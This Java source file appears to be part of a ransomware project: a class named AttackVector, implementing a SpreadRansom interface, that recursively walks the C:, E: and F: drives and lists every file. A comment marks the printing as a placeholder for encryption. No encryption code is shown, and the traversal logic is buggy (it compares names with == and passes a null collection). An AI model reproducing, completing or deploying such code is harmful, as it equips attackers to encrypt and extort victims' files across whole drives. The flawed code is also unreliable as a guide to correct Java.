package Agent.Attack;

import java.io.File;
import java.util.Collection;

import Agent.SpreadR.SpreadRansom;

public class AttackVector implements SpreadRansom {

	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	// Recursive function to traverse the given directory in Java using DFS
	public void listf(String directoryName, Collection<File> dirs) {
		File directory = new File(directoryName);

		// Get all files from a directory.
		File[] fList = directory.listFiles();
		if (fList != null) {
			for (File file : fList) {
				if (file.isDirectory()) {
					try {
						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
						}
					} catch (NullPointerException e) {
					}
					System.out.println("directory:" + file.getName() + "\n");
					listf(file.getAbsolutePath(), dirs);

					//
				} else if (file.isFile()) {
					System.out.println("\t" + file.getName());
					// encryption instead of pronting names of files and directories

				}
			}
		}
	}

	@Override
	public void spread() {

		Collection<File> _folderTree = null;
		System.out.println("c:");
		// listf("C:\\", _folderTree);
		listf("C:\\", _folderTree);
		System.out.println("\n E:");
		listf("E:\\", _folderTree);
		System.out.println("\nF:");
		listf("F:\\", _folderTree);
	}

}